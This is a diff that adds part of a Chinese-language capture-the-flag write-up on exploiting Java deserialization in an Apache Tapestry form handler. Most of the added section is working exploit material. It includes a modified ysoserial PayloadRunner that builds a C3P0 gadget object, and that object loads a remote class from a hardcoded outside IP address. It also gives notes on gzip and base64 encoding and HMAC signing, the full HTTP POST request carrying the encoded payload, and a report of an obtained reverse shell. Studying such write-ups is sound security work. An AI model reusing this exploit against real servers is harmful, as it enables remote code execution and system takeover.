@@ -42,7 +42,123 @@ org.apache.tapestry5.internal.services.assets.ContextAssetRequestHandler#Context
 
 通过C3P0构造exp，记得要gzip压缩以及base64编码，通过debug模式获得正确的签名。
 
+构造一个恶意的反序列化对象，
+![](https://i.imgur.com/SKBYGuL.png)
 
+然后用ysoserial，生成C3P0 gadget的远程类加载，不明白的话可以参考：https://blog.csdn.net/fnmsd/article/details/88959428：
+恶意对象生成代码如下，ois中需要和题目中一致，先压入UTF和boolean变量，最后压入恶意对象：
+```java
+package ysoserial.payloads.util;
+
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.util.concurrent.Callable;
+
+import ysoserial.Deserializer;
+import ysoserial.Serializer;
+
+import static ysoserial.Deserializer.deserialize;
+import static ysoserial.Serializer.serialize;
+
+import ysoserial.payloads.ObjectPayload;
+import ysoserial.payloads.ObjectPayload.Utils;
+import ysoserial.secmgr.ExecCheckingSecurityManager;
+
+/*
+ * utility class for running exploits locally from command line
+ */
+@SuppressWarnings("unused")
+public class PayloadRunner {
+
+    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
+        // ensure payload generation doesn't throw an exception
+        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
+            public byte[] call() throws Exception {
+                final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();
+
+                System.out.println("generating payload object(s) for command: '" + command + "'");
+
+                ObjectPayload<?> payload = clazz.newInstance();
+                final Object objBefore = payload.getObject(command);
+
+                //保存恶意对象
+                //定义myObj对象
+                //创建一个包含对象进行反序列化信息的”object”数据文件
+                FileOutputStream fos = new FileOutputStream("utf_boolean_object_curl");
+                ObjectOutputStream os = new ObjectOutputStream(fos);
+                //writeObject()方法将myObj对象写入object文件
+                String completeId = "Index:query";
+                boolean cancel = false;
+                os.writeUTF(completeId);
+                os.writeBoolean(cancel);
+                os.writeObject(objBefore);
+                os.close();
+
+                System.out.println("serializing payload");
+                byte[] ser = Serializer.serialize(objBefore);
+                Utils.releasePayload(payload, objBefore);
+                return ser;
+            }
+        });
+
+        try {
+            System.out.println("deserializing payload");
+            final Object objAfter = Deserializer.deserialize(serialized);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    private static String getDefaultTestCmd() {
+        return getFirstExistingFile(
+            "C:\\Windows\\System32\\calc.exe",
+            "/Applications/Calculator.app/Contents/MacOS/Calculator",
+            "/usr/bin/gnome-calculator",
+            "/usr/bin/kcalc"
+        );
+    }
+
+    private static String getFirstExistingFile(String... files) {
+        return "http://13.75.106.78/:Exploit";
+//        for (String path : files) {
+//            if (new File(path).exists()) {
+//                return path;
+//            }
+//        }
+//        throw new UnsupportedOperationException("no known test executable");
+    }
+}
+
+```
+题目中，恶意对象需要进行gzip和base64编码，所以在传输之前我们也需要编码一下：
+![](https://i.imgur.com/3j7WN1V.png)
+然后在本地环境中计算hmac：
+![](https://i.imgur.com/lP4yEjh.png)
+![](https://i.imgur.com/Ddulrsa.png)
+
+最后的exp:
+
+```http
+POST /index.searchform HTTP/1.1
+Host: 192.168.201.15
+Content-Length: 966
+Accept: */*
+Origin: http://192.168.201.15
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
+DNT: 1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://192.168.201.15/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+Cookie: JSESSIONID=1623268FF644F09860886B2D8EA4A475
+Connection: close
+
+t%3Asubmit=%5B%22submit_0%22%2C%22submit_0%22%5D&t%3Aformdata=LD5rGQtL2Qa2eqzSb1uWlvYZmxA%3d%3aH4sIADST%2b1wAA3VTPW8TQRCdxI4gHwRDAgptlAIo7uJEISgRBTGgWDIhwlGElGq9N4kv2du97O45ZyQ%2bGkokOjqQqFIg8R8ooAJBSUMNBb8BZu8c43xtdTv75s17M3Pv/8DA3igMV2WA6cJugroNRsNVriIv4k0mt9BrzXh8Np72VpUSS4zvYHCHWVZXieb4c/KL%2bPz32X4/QKph7qS0MIqFd7thrGbcnsQB%2bekrZBzlUzlOyl1ipif/bBVKMomWUcSo15oaWWBqMMGVlMhtqKSj%2bJ9sYaq2zVos9c2u8CunoBZrMBp0byssoryLWZ4vSKRftzqUW4QawtSiNERgLJzPEYkNhX%2bfxfQ8vkn%2blW5XBDOmpjhzpXbhKRRrcC4MUNrQttfUDh4ECzEnosmcqIFMGn9VK3Jm25WsPfUkjpW2xF1oHYOuo1WsIfAwNI33%2bqGPJnzrSJsli8iF9xA3UaPkSAsRanSCp7qxOuqQifAxBo0rL759v/5xrN/pHKb%2bWvKet2as09Kc0HdBJxBly8KlnqYsM9O0TiC9FgmMzvVQDQb1QTkLE4e5ukLIBh1ycTl7Pyb%2b16c37/Z/vxzM5A2wINCmO7Os%2bHrmjCqPcDeNe/lkOn0f740dGdRg9rbSkVtMnYiS4/Ucr5fz/nj9ZOP54gdayEIVLnAWM06jrUquMaIxV2EERfZVUYm0GzDcubqdowZu9CzXg8Y2UZLfzpJDog8AngN4HcCrr4/elsw14f5Dhx2Kuye1cOZuGgsVWgvjTWvjBd8vz3rzc155%2boY3f9MnAOYAh98rujqp25P0H/EdopgfBAAA&query=*&rowsPerPage=10
+```
+通过hmac验证后，反序列化成功反弹shell
+![](https://i.imgur.com/Ne4lP0d.png)
 
 官方给的解答：
 
